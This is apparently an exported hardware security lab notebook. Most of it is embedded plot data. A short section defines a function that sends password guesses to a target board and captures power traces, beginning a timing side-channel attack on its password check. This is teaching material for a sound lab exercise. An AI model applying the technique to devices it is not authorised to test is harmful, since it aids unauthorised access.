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","dtype":"float64","shape":[800]}},"selected":{"id":"1046","type":"Selection"},"selection_policy":{"id":"1045","type":"UnionRenderers"}},"id":"1034","type":"ColumnDataSource"},{"attributes":{"callback":null},"id":"1003","type":"DataRange1d"},{"attributes":{"callback":null},"id":"1005","type":"DataRange1d"},{"attributes":{},"id":"1009","type":"LinearScale"},{"attributes":{"formatter":{"id":"1042","type":"BasicTickFormatter"},"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1011","type":"LinearAxis"},{"attributes":{},"id":"1017","type":"BasicTicker"},{"attributes":{},"id":"1012","type":"BasicTicker"},{"attributes":{"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1015","type":"Grid"},{"attributes":{"dimension":1,"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1020","type":"Grid"},{"attributes":{"formatter":{"id":"1044","type":"BasicTickFormatter"},"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1016","type":"LinearAxis"},{"attributes":{"source":{"id":"1034","type":"ColumnDataSource"}},"id":"1038","type":"CDSView"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1021","type":"PanTool"},{"id":"1022","type":"WheelZoomTool"},{"id":"1023","type":"BoxZoomTool"},{"id":"1024","type":"SaveTool"},{"id":"1025","type":"ResetTool"},{"id":"1026","type":"HelpTool"}]},"id":"1027","type":"Toolbar"},{"attributes":{},"id":"1021","type":"PanTool"},{"attributes":{},"id":"1022","type":"WheelZoomTool"},{"attributes":{"overlay":{"id":"1047","type":"BoxAnnotation"}},"id":"1023","type":"BoxZoomTool"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1035","type":"Line"},{"attributes":{},"id":"1024","type":"SaveTool"},{"attributes":{},"id":"1025","type":"ResetTool"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1036","type":"Line"},{"attributes":{},"id":"1026","type":"HelpTool"}],"root_ids":["1002"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"609341b6-198c-40f8-bbca-05967d1f3506","roots":{"1002":"6331c1d7-304f-4366-95a2-2a079696330a"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

Timing Analysis
---------------

Now that we can capture traces, we can begin planning our attack. First
we'll make a function to guess a password and return a power trace,
since we'll be repeating those steps a lot:


**In [13]:**

.. code:: ipython3

    def cap_pass_trace(pass_guess):
        ret = ""
        reset_target(scope)
        num_char = target.in_waiting()
        while num_char > 0:
            ret += target.read(num_char, 10)
            time.sleep(0.01)
            num_char = target.in_waiting()
    
        scope.arm()
        target.write(pass_guess)
        ret = scope.capture()
        if ret:
            print('Timeout happened during acquisition')
    
        trace = scope.get_last_trace()
        return trace

Next, we'll try two different passwords and see if the power traces
differ by length. We'll then plot both traces on the same figure (with
the first in red and the second in blue).


**In [14]:**

.. code:: ipython3

    trace = cap_pass_trace("\n")
    new_trace = cap_pass_trace("h\n")
    x_range = range(0, len(new_trace))
    p = figure()
    p.add_tools(CrosshairTool())
    p.line(x_range, new_trace)
    p.line(x_range, trace, line_color='red')
    show(p)


**Out [14]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    



.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="0248e654-57a0-496b-9a3d-9a59941744e3" data-root-id="1102"></div>
    
    </div>



.. raw:: html

    

    <div id="9bacce78-d1d9-4af8-9c3e-8a00f7f91c10"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#9bacce78-d1d9-4af8-9c3e-8a00f7f91c10');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"e511d739-f85e-4bd4-95b5-3d6117174e55":{"roots":{"references":[{"attributes":{"below":[{"id":"1111","type":"LinearAxis"}],"center":[{"id":"1115","type":"Grid"},{"id":"1120","type":"Grid"}],"left":[{"id":"1116","type":"LinearAxis"}],"renderers":[{"id":"1139","type":"GlyphRenderer"},{"id":"1144","type":"GlyphRenderer"}],"title":{"id":"1155","type":"Title"},"toolbar":{"id":"1127","type":"Toolbar"},"x_range":{"id":"1103","type":"DataRange1d"},"x_scale":{"id":"1107","type":"LinearScale"},"y_range":{"id":"1105","type":"DataRange1d"},"y_scale":{"id":"1109","type":"LinearScale"}},"id":"1102","subtype":"Figure","type":"Plot"},{"attributes":{},"id":"1122","type":"WheelZoomTool"},{"attributes":{},"id":"1126","type":"HelpTool"},{"attributes":{},"id":"1125","type":"ResetTool"},{"attributes":{},"id":"1134","type":"CrosshairTool"},{"attributes":{},"id":"1124","type":"SaveTool"},{"attributes":{},"id":"1121","type":"PanTool"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1121","type":"PanTool"},{"id":"1122","type":"WheelZoomTool"},{"id":"1123","type":"BoxZoomTool"},{"id":"1124","type":"SaveTool"},{"id":"1125","type":"ResetTool"},{"id":"1126","type":"HelpTool"},{"id":"1134","type":"CrosshairTool"}]},"id":"1127","type":"Toolbar"},{"attributes":{"overlay":{"id":"1165","type":"BoxAnnotation"}},"id":"1123","type":"BoxZoomTool"},{"attributes":{"source":{"id":"1136","type":"ColumnDataSource"}},"id":"1140","type":"CDSView"},{"attributes":{"data_source":{"id":"1136","type":"ColumnDataSource"},"glyph":{"id":"1137","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1138","type":"Line"},"selection_glyph":null,"view":{"id":"1140","type":"CDSView"}},"id":"1139","type":"GlyphRenderer"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799],"y":{"__ndarray__":"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